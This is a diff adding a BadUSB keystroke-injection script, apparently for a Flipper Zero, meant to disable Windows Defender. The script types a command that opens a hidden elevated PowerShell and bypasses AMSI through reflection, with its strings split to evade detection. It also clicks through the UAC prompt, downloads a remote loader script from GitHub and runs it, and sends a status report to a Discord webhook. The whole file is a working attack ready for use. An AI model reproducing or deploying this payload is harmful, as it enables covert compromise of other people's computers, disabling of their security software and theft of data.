@@ -1,0 +1,25 @@
+REM ============================================================
+REM 🛡️ Disable Defender - Windows
+REM ============================================================
+REM Author: dil1thium
+REM Version: 3.0 (Modular)
+REM Target: Windows 10/11
+REM Category: Execution
+REM Requires: Admin (UAC prompt)
+REM
+REM Adds exclusions and attempts to disable protections.
+REM Note: Tamper Protection may block some actions.
+REM
+REM CONFIGURE:
+REM   YOUR_DISCORD_WEBHOOK - Receives status report
+REM ============================================================
+ID 1234:5678 Manufacturer:Keyboard
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell Start-Process powershell -Verb runAs -ArgumentList '-w h -ep bypass "$a=[Ref].Assembly.GetType(''System.Management.Automation.Amsi''+''Utils'');$f=$a.GetField(''amsi''+''InitFailed'',''NonPublic,Static'');$f.SetValue($null,$true);$env:DC=''YOUR_DISCORD_WEBHOOK'';$env:M=''defender'';irm https://raw.githubusercontent.com/reschjonas/FlipperZero_BadUSB/main/remote-payloads/loaders/loader.ps1|iex"'
+ENTER
+DELAY 1500
+LEFTARROW
+DELAY 200
+ENTER
